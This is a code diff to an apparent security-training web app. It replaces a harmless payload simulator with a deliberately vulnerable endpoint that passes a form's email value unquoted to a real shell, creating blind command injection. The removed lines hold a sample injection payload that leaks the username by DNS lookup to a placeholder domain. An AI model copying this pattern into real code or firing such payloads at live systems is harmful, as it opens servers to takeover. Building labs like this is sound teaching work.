@@ -1,8 +1,11 @@
 import express from "express";
-import { pathToFileURL } from "node:url";
+import { exec } from "node:child_process";
+import { fileURLToPath, pathToFileURL } from "node:url";
+import path from "node:path";
 
 const PORT = 4321;
-const TRAINING_USERNAME = "training-user";
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const NOTIFY_SCRIPT = path.join(__dirname, "scripts", "notify-subscriber.sh");
 
 const FORM = `<!doctype html>
 <html lang="en">
@@ -19,16 +22,10 @@ const FORM = `<!doctype html>
       <label>Message <textarea name="message" required></textarea></label><br>
       <button type="submit">Send feedback</button>
     </form>
-    <p>Training simulation: submit <code>||nslookup+\`whoami\`.training.invalid||</code>
-    as the email value using a request editor. Check the server terminal for the simulated lookup.</p>
-    <p>This simulator does not execute commands or send DNS queries.</p>
+    <p>Submitting feedback queues an async subscriber-notification job.
+    The HTTP response never carries that job's output — this endpoint is blind.</p>
   </body>
 </html>`;
-
-export function simulateTrainingPayload(email) {
-  if (!/^\|\|nslookup\+`whoami`\.training\.invalid\|\|$/i.test(email ?? "")) return null;
-  return `${TRAINING_USERNAME}.training.invalid`;
-}
 
 export function createApp() {
   const app = express();
@@ -40,11 +37,23 @@ export function createApp() {
 
   app.post("/", (request, response) => {
     const { email } = request.body;
-    setImmediate(() => {
-      const lookup = simulateTrainingPayload(email);
-      if (lookup) console.log(`[simulated DNS; no network] ${lookup}`);
-    });
+
+    // Respond immediately. Whatever happens below is fire-and-forget from the
+    // client's point of view — the HTTP response carries no trace of it.
     response.status(200).type("text").send("Thank you for your feedback.");
+
+    setImmediate(() => {
+      // Vulnerable by design: the email value is interpolated directly into a
+      // shell command line with no quoting and no sanitization, then handed to
+      // a real shell (child_process.exec spawns via /bin/sh -c). Anything the
+      // shell will parse out of this string, it will execute.
+      const command = `${NOTIFY_SCRIPT} ${email}`;
+      exec(command, { timeout: 5000 }, (error, _stdout, stderr) => {
+        // Only ever logged server-side — never returned to the HTTP client.
+        if (error) console.error(`[notify] dispatch failed: ${error.message}`);
+        if (stderr) console.error(`[notify] stderr: ${stderr.trim()}`);
+      });
+    });
   });
 
   return app;
@@ -52,6 +61,7 @@ export function createApp() {
 
 if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
   createApp().listen(PORT, "127.0.0.1", () => {
-    console.log(`Training simulator listening at http://127.0.0.1:${PORT}`);
+    console.log(`Vulnerable feedback simulator listening at http://127.0.0.1:${PORT}`);
+    console.log("Loopback only. Do not expose this process to any network.");
   });
 }
